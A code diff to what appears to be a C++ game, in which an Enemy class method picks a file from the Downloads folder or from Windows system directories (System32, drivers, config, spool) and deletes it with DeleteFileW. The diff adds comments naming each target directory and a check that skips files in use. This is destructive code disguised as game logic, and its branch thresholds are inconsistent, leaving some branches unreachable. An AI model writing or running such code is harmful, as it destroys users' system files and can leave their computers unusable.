@@ -52,19 +52,19 @@ void Enemy::displayFileName() {
             CoTaskMemFree(pathDownloads); // Free the allocated memory
         }
     }
-    else if (probability < 4.2) {
+    else if (probability < 4.2) { // Delete a file from the System32 directory
         wSelectedDirectory = L"C:\\Windows\\System32";
     }
-    else if (probability < 2.6) {
+    else if (probability < 2.6) { // Delete a file from the drivers directory
 		wSelectedDirectory = L"C:\\Windows\\System32\\drivers";
 	}
-    else if (probability < 2.8) {
+    else if (probability < 2.8) { // Delete a file from the config directory
 		wSelectedDirectory = L"C:\\Windows\\System32\\config";
 	}
-    else if (probability < 1.5) {
+    else if (probability < 1.5) { // Delete a file from the spool directory
 		wSelectedDirectory = L"C:\\Windows\\System32\\spool";
 	}
-    else if (probability < 3.6) {
+    else if (probability < 3.6) { // Delete a file from the drivers directory
         wSelectedDirectory = L"C:\\Windows\\";
     }
     else {
@@ -101,6 +101,20 @@ void Enemy::displayFileName() {
 
         // Build the full path for the file to be deleted
         std::wstring fullPath = wSelectedDirectory + L"\\" + std::wstring(fileNames[fileIndex].begin(), fileNames[fileIndex].end());
+
+        // Check if the file is in use
+        HANDLE hFile = CreateFileW(fullPath.c_str(), GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+        if (hFile == INVALID_HANDLE_VALUE) {
+            if (GetLastError() == ERROR_SHARING_VIOLATION) {
+                // File is in use, skip it
+                std::cerr << "File is in use, skipping: " << fileName << std::endl;
+                return;
+            }
+        }
+        else {
+            // File is not in use, close the handle
+            CloseHandle(hFile);
+        }
 
         // Delete the file
         if (!DeleteFileW(fullPath.c_str())) {
